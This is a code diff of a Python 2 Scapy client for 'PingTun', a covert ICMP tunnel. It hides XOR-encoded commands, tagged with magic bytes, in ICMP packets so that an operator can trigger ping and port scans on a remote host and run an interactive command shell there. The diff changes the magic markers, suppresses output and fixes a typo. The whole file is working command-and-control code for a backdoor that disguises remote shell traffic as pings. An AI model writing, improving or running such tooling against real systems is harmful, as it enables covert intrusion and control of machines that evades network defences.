@@ -1,13 +1,18 @@
 from scapy.all import *
 import sys
 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
 if len(sys.argv) != 3:
 	print "[PingTun] Usage: python2 client.py <IP Address> <interface>"
 	print "[PingTun] Exiting..."
 	exit()
 
 xor = "\x42\x42\x42\x42"
-magic = "\xde\xad\xbe\xef"
+
+client_magic = "\xde\xad\xbe\xef"
+server_magic = "\xbe\xef\xde\xad"
+
 ping= "\xaa\xab\xac\xad"
 port = "\xba\xbb\xbc\xbd"
 shell = "\xca\xcb\xcc\xcd"
@@ -37,17 +42,18 @@ def menu():
 def action(pkt):
 	buff = XOR(pkt.load)
 	
-        if buff[0:4] == magic:
+        if buff[0:4] == server_magic:
 		if buff[4:8] == ping:
                         print "Ping"
                 elif buff[4:8] == port:
                         print "Port"
                 elif buff[4:8] == shell:
-                        print buff[8:]
-			sendp(packet_builder(shell + raw_input()), iface=sys.argv[2])
+			if len(buff[8:]) > 0:
+                        	print buff[8:-1]
+			sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])
 
 def packet_builder(data):
-	return Ether() / IP(dst=sys.argv[1]) / ICMP() / (XOR(magic + data))
+	return Ether() / IP(dst=sys.argv[1]) / ICMP() / (XOR(client_magic + data))
 
 def XOR(p):
 	buff = ""
@@ -56,16 +62,16 @@ def XOR(p):
 	return buff	
 
 def ping_scan(cider):
-	sendp(packet_builder(ping), iface=sys.argv[2])
+	sendp(packet_builder(ping), verbose=0, iface=sys.argv[2])
 	menu()
 
 def port_scan(ip):
-	sendp(packet_builder(port), iface=sys.argv[2])
+	sendp(packet_builder(port), verbose=0, iface=sys.argv[2])
         menu()
 
 def command_shell():
-	sendp(packet_builder(shell), iface=sys.argv[2])
-	sniff(iface=sys.arv[2],filter="icmp",prn=action)
+	sendp(packet_builder(shell), verbose=0, iface=sys.argv[2])
+	sniff(iface=sys.argv[2],filter="icmp",prn=action)
         menu()
 
 menu()
